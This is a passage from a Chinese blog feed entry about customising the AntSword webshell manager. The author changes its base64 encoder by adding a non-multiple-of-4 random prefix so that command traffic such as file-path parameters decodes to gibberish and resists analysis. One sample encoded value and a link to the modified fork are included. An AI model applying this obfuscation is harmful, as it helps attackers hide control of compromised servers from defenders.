src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900375220-79dd6cc2-ad68-4419-b11e-025c2723f61d.png" alt="img"></p><p>期间遇到一个小坑，就是无法在format()函数中获取opts的值</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900375484-16e159f2-710e-436e-a8b1-55e733fbf500.png" alt="img"></p><p>后来发现蚁剑中是这样写的</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900375620-06bf0dd8-1889-4c00-a81d-41ccbc9b5811.png" alt="img"></p><p>还特意把原来的<code>new this.format</code>给注释掉换成<code>Base.prototype.format</code>的形式，具体原因我也不知道为什么。如果有知道的师傅麻烦告诉我一下。</p><p>既然追求刺激，那就贯彻到底，直接把opts传给format函数，然后在format中重新取所需要的变量。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900375710-dab66dcd-5e68-4a09-bcca-8f27e19366e3.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900375796-050475a2-87ee-44b7-9abb-3f5c4167cb8b.png" alt="img"></p><h3 id="测试">测试</h3><p>前缀长度默认为2，可以自行修改，只要不是4的倍数即可(原因自己思考一下)。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900375894-4669a6d5-ee50-4b27-8486-ac0f63f28396.png" alt="img"></p><p>可以正常使用</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900375982-10096851-a83f-4f2e-bb02-90e33216c9bf.png" alt="img"></p><p>其中<code>prototype</code>为我们传入的第三方参数的值，在这里是要打开目录的绝对路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prototype=ojRDovcGhwU3R1ZHkvUEhQVHV0b3JpYWwvV1dXL3BocE15QWRtaW4v</span><br></pre></td></tr></table></figure><p>直接base64解码会是乱码</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376144-3f30dac2-f077-4a5b-9c37-7d2dde3caaeb.png" alt="img"></p><p>去掉前两位后我们进行解码则可以得到正确的结果。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376229-141f6b38-d1fc-4a7f-94d8-7f68ffa4cfcf.png" alt="img"></p><h2 id="最后">最后</h2><p>偏移两位的效果可能还不是很明显，容易被猜出。但是当前缀长度达到10位以上的时候，就很难分析出最后的结果。</p><p>对php类型修改后我在本地测试了主要的13个功能，均可以正常使用。但是由于涉及到修改核心payload，等确定没有bug了再改其他的。</p><p>由于我是在父类Base中修改的编码模块，想修改其他类型的shell只需要照葫芦画瓢改一下对应的模版即可。</p><p>修改后的项目地址：</p><p><a href="https://github.com/yzddmr6/antSword/tree/v2.1.x" target="_blank" rel="noopener">https://github.com/yzddmr6/antSword/tree/v2.1.x</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。&lt;/p&gt;&lt;p&gt;因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="中国蚁剑" scheme="https://yzddmr6.tk/tags/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
</feed>
